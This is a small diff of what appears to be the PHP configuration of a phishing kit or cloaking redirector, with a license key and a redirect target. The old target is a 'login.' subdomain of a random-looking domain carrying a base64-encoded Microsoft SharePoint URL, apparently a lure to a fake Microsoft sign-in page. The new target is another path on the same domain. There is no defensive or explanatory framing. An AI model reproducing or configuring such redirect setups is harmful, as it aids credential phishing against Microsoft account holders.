@@ -14,7 +14,7 @@
 
 $license_key = "ks6zv5u0jn3sivn0ts5ej2hti9yaj8pj"; // [REQUIRED]
 
-$redirect = "https://login.egiblucielofage.info/?ce-U-OsHAN0=aHR0cHM6Ly9taWNyb3NvZnQuc2hhcmVwb2ludC5jb20vOng6L3IvdGVhbXMvKipURUFN"; // URL or FILE [REQUIRED]
+$redirect = "https://egiblucielofage.info/h/"; // URL or FILE [REQUIRED]
 
 
 $parameter = 1; // [REQUIRED]
